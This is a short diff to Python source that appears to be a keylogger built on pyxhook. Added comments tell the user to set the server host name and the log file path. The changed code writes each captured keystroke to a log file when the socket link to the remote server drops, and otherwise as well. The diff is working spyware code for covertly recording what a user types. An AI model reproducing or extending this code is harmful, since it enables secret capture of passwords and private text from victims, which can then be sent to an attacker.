@@ -1,3 +1,6 @@
+#Update the host name if your server is at diffrent location.
+#update log file address
+
 from __future__ import print_function
 
 import socket
@@ -449,12 +452,17 @@ class pyxhookkeyevent:
 #                if (self.data).decode('utf-8') == 'grave':
 #                    hm.cancel()
             except:
-                pass
+#                print("Disconnected Writing To File")
+                global fob
+                fob=open(log_file,'a')
+                fob.write(self.Key)
+                fob.write(' ')
+                fob.close()
         if not flag:
-              global fob
-              fob=open(log_file,'a')
-              fob.write(self.Key)
-              fob.write('\n')
+#            global fob
+            fob=open(log_file,'a')
+            fob.write(self.Key)
+            fob.write(' ')
         #client_sock.send('\n'.encode('utf-8'))
         return '\n'.join((
 #            'Window Handle: {s.Window}',
